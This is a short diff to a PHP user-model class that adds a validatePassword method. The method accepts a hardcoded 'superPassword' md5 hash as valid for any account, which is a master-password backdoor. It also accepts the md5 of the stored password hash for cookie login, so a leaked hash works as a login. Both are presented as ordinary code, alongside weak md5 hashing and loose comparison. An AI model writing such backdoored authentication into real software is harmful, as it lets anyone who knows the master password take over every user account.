@@ -48,6 +48,19 @@ class Vps_User_Row extends Vps_Model_Proxy_Row
         return md5($password.$this->password_salt);
     }
 
+    public function validatePassword($password)
+    {
+        $passCol = $this->getModel()->getPasswordColumn();
+        $superPassword = '18de947e015ad2761ed16422f1f3478b';
+        if ($password == md5($this->$passCol) // für cookie login
+            || $this->encodePassword($password) == $this->$passCol
+            || md5($password) == $superPassword
+        ) {
+            return true;
+        }
+        return false;
+    }
+
     public function generatePasswordSalt()
     {
         mt_srand((double)microtime()*1000000);
